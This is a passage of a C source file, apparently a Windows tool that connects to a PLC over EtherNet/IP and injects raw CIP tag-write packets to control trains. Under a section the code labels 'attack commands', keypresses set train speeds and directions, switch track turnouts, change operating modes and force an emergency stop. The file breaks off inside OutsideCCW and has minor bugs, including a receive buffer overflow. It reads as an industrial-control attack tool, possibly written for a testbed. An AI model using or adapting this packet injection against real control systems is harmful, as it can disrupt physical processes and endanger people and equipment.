/* connect.c
it is used to connect PLC
*/
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_NONSTDC_NO_WARNINGS
#define  _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>     /* Note: winsock2.h has included windows.h */
#include <conio.h>  //Include keyboard listening function kbhit()
#include <time.h>
#include "reference.h"

SOCKET        HMI007;   /* defined in winsock2.h */
byte sendMessageStr[100]; /* message to be sent to server */
byte SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4;	/*session handle value*/
byte ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4;		/*connection ID*/
byte CIPCount1 = 0xfa, CIPCount2 = 0x00;
char  recvBuffer[100], input=0;
int sendStatus, recvStatus, i;

void EmergencyStop(void);
void InsideSpeedZero(void);
void InsideSpeedMid1(void);
void InsideSpeedMid2(void);
void InsideSpeedMax(void);
void OutsideSpeedZero(void);
void OutsideSpeedMid1(void);
void OutsideSpeedMid2(void);
void OutsideSpeedMax(void);
void CrossTrack(void);
void ParallelTrack(void);
void OutsideCW(void);
void OutsideCCW(void);
void InsideCW(void);
void InsideCCW(void);
void ManualMode(void);
void AutoMode(void);
void ToStation2(void);
void ToStation3(void);
void ToStation4(void);

int main(void)
{
	WSADATA       wsa_data;           /* defined in winsock2.h */
	struct sockaddr_in HMI;     /* defined in winsock2.h */
	struct hostent     *host = NULL;  /* defined in winsock2.h */

	//double time_old, time_new, time_interval = 0;


	printf("======== Connect to PLC ========\n\n");

	/* Step 1: startup winsocket - this is for Windows only */
	/* in pair with WSACleanup()                    */
	if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
	{
		puts("WSAStartup failed!");
		exit(1);
	}

	/* Step 2: Create socket and check it is successful */
	/* in pair with closesocket()               */
	HMI007 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (HMI007 == INVALID_SOCKET)
	{
		printf("Failed to create socket(): %d\n", WSAGetLastError());
		exit(1);
	}

	/* Step 3: Setup TCP Server Parameters */
	HMI.sin_family = AF_INET;
	HMI.sin_addr.s_addr = inet_addr(MY_SERVER_IP_ADDRESS); /* defined in tcpserverclient.h */
	HMI.sin_port = htons(MY_SERVER_PORT_NUMBER);           /* defined in tcpserverclient.h */

														   /* Step 3.2: Connect to the TCP Server */
	if (connect(HMI007, (struct sockaddr *)&HMI, sizeof(HMI)) == SOCKET_ERROR)
	{
		printf("connect() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	/* Step 4: Listen */
	listen(HMI007, 8);

	/*Step 5: Initialization */
	// Register session
	byte Rgsession[] = { 0x65, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x4e, 0x43, 0x45, 0x44, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
	sendStatus = send(HMI007, Rgsession, 28, 0);
	// Receive session number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	// Store session number
	SessionHandle1 = recvBuffer[4];
	SessionHandle2 = recvBuffer[5];
	SessionHandle3 = recvBuffer[6];
	SessionHandle4 = recvBuffer[7];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	//Ask for connection ID
	byte connetionmanager[] = {0x6f, 0x00, 0x40, 0x00, SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x30, 0x00, 0x54, 0x02, 0x20, 0x06, 0x24, 0x01, 0x07, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x3f, 0x00, 0x41, 0x52, 0x43, 0x48, 0x49, 0x45, 0x02, 0x00, 0x00, 0x00, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0x80, 0x84, 0x1e, 0x00, 0xfc, 0x43, 0xa3, 0x03, 0x01, 0x00, 0x20, 0x02, 0x24, 0x01 };
	sendStatus = send(HMI007, connetionmanager, 88, 0);
	// Receive session number
	recvStatus = recv(HMI007, recvBuffer, 128, 0);
	ConnectionID1 = recvBuffer[44];
	ConnectionID2 = recvBuffer[45];
	ConnectionID3 = recvBuffer[46];
	ConnectionID4 = recvBuffer[47];
	recvBuffer[recvStatus] = 0x00; /* '\0' */

	/*Step 6: attack commands */
	for (;;)
	{
		if (kbhit())				// if any input from the keyboard
		{
			input = getch();
			switch (input)
			{
			//emergency stop (press 0)
			case 48: EmergencyStop(); break;
			//inside speed	(press 1,2,3,4)
			case 49: InsideSpeedZero(); break;
			case 50: InsideSpeedMid1(); break;
			case 51: InsideSpeedMid2(); break;
			case 52: InsideSpeedMax(); break;
			//outside speed	(press 6,7,8,9)
			case 54: OutsideSpeedZero(); break;
			case 55: OutsideSpeedMid1(); break;
			case 56: OutsideSpeedMid2(); break;
			case 57: OutsideSpeedMax(); break;
			//change track to cross	(press x or X)
			case 88: CrossTrack(); break;
			case 120: CrossTrack(); break;
			//change track to parallel	(press z or Z)
			case 90: ParallelTrack(); break;
			case 122: ParallelTrack(); break;
			//inside clockwise	(press i or I)
			case 73: InsideCW(); break;
			case 105: InsideCW(); break;
			//inside counter clockwise	(press u or U)
			case 85: InsideCCW(); break;
			case 117: InsideCCW(); break;
			//outside clockwise		(press o or O)
			case 79: OutsideCW(); break;
			case 111: OutsideCW(); break;
			//outside counter clockwise		(press p or P)
			case 80: OutsideCCW(); break;
			case 112: OutsideCCW(); break;
			//enter manual mode		(press m or M)
			case 77: ManualMode(); break;
			case 109: ManualMode(); break;
			//enter auto mode		(press a or A)
			case 65: AutoMode(); break;
			case 97: AutoMode(); break;
			//to station 2		(press s or S)
			case 83: ToStation2(); break;
			case 115: ToStation2(); break;
			//to station 3		(press d or D)
			case 68: ToStation3(); break;
			case 100: ToStation3(); break;
			//to station 4		(press f or F)
			case 70: ToStation4(); break;
			case 102: ToStation4(); break;

			default: break;
			}
		}
	
		//Sending normal packet1
		//Sending normal packet2
		//Sending normal packet3
		
	}

	return 0;
}





void EmergencyStop(void)
{
	//outside stop
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x31, 0x5f, 0x4f, 0x66, 0x66, /*Train1_off*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 65, 0);
	CIPCount1++;
	Sleep(80);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x31, 0x5f, 0x4f, 0x66, 0x66, /*Train1_off*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 65, 0);
	CIPCount1++;
	Sleep(80);

	//inside stop
	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x32, 0x5f, 0x4f, 0x66, 0x66, /*Train2_off*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 65, 0);
	CIPCount1++;
	Sleep(80);

	byte sendMessageStr4[] = { 0x70, 0x00,	/*Send Unit Data*/		0x29, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x15, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x06, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0a,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x32, 0x5f, 0x4f, 0x66, 0x66, /*Train2_off*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr4, 65, 0);
	CIPCount1++;

}

void InsideSpeedZero(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x32, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed2_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void InsideSpeedMid1(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x32, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed2_Tag*/	0xc4, 0x00, 0x01, 0x00, 0xdd, 0x02, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void InsideSpeedMid2(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x32, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed2_Tag*/	0xc4, 0x00, 0x01, 0x00, 0xba, 0x05, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void InsideSpeedMax(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x32, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed2_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x98, 0x08, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void OutsideSpeedZero(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x31, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed1_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void OutsideSpeedMid1(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x31, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed1_Tag*/	0xc4, 0x00, 0x01, 0x00, 0xdd, 0x02, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void OutsideSpeedMid2(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x31, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed1_Tag*/	0xc4, 0x00, 0x01, 0x00, 0xba, 0x05, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void OutsideSpeedMax(void)
{
	byte sendMessageStr[] = { 0x70, 0x00,	/*Send Unit Data*/		0x32, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x1e, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x09, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x10,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x53, 0x70, 0x65, 0x65, 0x64, 0x31, 0x5f, 0x54, 0x61, 0x67, /*Train_Speed1_Tag*/	0xc4, 0x00, 0x01, 0x00, 0x98, 0x08, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr, 74, 0);
	CIPCount1++;

}

void CrossTrack(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x33, /*Turnout_6_3*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 67, 0);
	CIPCount1++;

}

void ParallelTrack(void)
{
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x32, /*Turnout_6_2*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(500);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x32, /*Turnout_6_2*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
	Sleep(2500);

	byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0b,	/*Data Size*/
		0x54, 0x75, 0x72, 0x6e, 0x6f, 0x75, 0x74, 0x5f, 0x36, 0x5f, 0x32, /*Turnout_6_2*/	0x00,		0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr3, 67, 0);
	CIPCount1++;

}

void OutsideCW(void)
{
	//outside clockwise
	byte sendMessageStr1[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_1_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr1, 67, 0);
	CIPCount1++;
	Sleep(10);

	byte sendMessageStr2[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
		ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
		0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
		0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_1_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x00 /*Specific Data*/ };

	sendStatus = send(HMI007, sendMessageStr2, 67, 0);
	CIPCount1++;
}

void OutsideCCW(void)
{
	//outside counter clockwise
